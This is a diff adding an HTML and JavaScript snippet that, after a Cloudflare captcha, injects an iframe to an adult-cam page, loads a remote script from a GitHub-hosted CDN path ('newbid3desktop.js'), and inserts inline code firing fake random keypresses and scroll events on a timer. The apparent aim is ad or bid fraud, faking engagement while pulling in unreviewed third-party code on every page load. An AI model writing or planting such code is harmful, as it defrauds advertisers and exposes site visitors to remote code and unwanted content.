@@ -1,0 +1,93 @@
+<div class="cf-turnstile" data-sitekey="0x4AAAAAAATxbAZe1ABfQkus" data-callback="loadContentAfterCaptcha" data-unique-id="bid"></div>
+
+<!-- Load the captcha script first -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer></script>
+
+<script>
+  function loadContentAfterCaptcha() {
+    // Load the iframe
+    loadIframe();
+
+    // Load the additional scripts
+    loadAdditionalScripts();
+  }
+
+  function loadIframe() {
+    // Implement logic to load the iframe, e.g., by adding an iframe tag to the document
+    const iframe = document.createElement('iframe');
+    iframe.width = '300';
+    iframe.height = '250';
+    iframe.src = 'https://www.smokeebash.com/2024/04/bongacams.html';
+    iframe.frameBorder = '0';
+    iframe.scrolling = 'no';
+    document.body.appendChild(iframe);
+  }
+
+  function loadAdditionalScripts() {
+    // Load the additional scripts
+    loadScript('https://cdn.jsdelivr.net/gh/smokey2335/solved3@main/newbid3desktop.js');
+    loadScriptInline(`
+      function getRandomKey() {
+        const keys = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        const randomIndex = Math.floor(Math.random() * keys.length);
+        return keys.charAt(randomIndex);
+      }
+
+      function simulateKeyPress() {
+        const key = getRandomKey();
+        const event = new KeyboardEvent('keydown', {
+          key: key,
+          code: 'Key' + key,
+          keyCode: key.charCodeAt(0),
+          which: key.charCodeAt(0),
+          shiftKey: Math.random() < 0.5, // Simulate random shift key press
+        });
+        document.dispatchEvent(event);
+      }
+
+      function getRandomInterval() {
+        // Generate a random interval between 500 milliseconds and 5000 milliseconds (0.5 and 5 seconds)
+        return Math.floor(Math.random() * (5000 - 500 + 1) + 500);
+      }
+
+      // Simulate a key press at random intervals
+      function simulateRandomKeyPress() {
+        simulateKeyPress();
+        setTimeout(simulateRandomKeyPress, getRandomInterval());
+      }
+
+      // Start the simulation
+      simulateRandomKeyPress();
+
+      // Function to simulate mouse wheel scrolling on the document or window
+      function simulateMouseWheel(deltaY) {
+          var event = new WheelEvent('wheel', {
+              deltaY: deltaY,
+              bubbles: true,
+              cancelable: true,
+              view: window
+          });
+          document.dispatchEvent(event); // Simulate on the document
+          // window.dispatchEvent(event); // Or simulate on the window
+      }
+
+      // Example usage
+      simulateMouseWheel(-400); // Simulate scrolling up
+      simulateMouseWheel(200); // Simulate scrolling down
+    `);
+  }
+
+  function loadScript(src) {
+    // Load external script
+    const script = document.createElement('script');
+    script.src = src;
+    document.head.appendChild(script);
+  }
+
+  function loadScriptInline(code) {
+    // Load inline script
+    const script = document.createElement('script');
+    script.textContent = code;
+    document.head.appendChild(script);
+  }
+</script>
